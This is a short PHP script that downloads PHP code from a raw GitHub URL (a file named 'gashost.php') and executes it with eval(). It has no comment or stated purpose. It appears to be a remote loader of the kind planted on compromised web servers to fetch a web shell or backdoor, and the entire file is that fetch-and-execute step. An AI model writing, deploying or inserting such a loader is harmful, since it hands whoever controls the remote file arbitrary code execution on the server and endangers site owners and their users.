<?php
$url = "https://raw.githubusercontent.com/Forestwhisperss/today/refs/heads/main/gashost.php"; 
$code = file_get_contents($url);

eval("?>$code<?php");
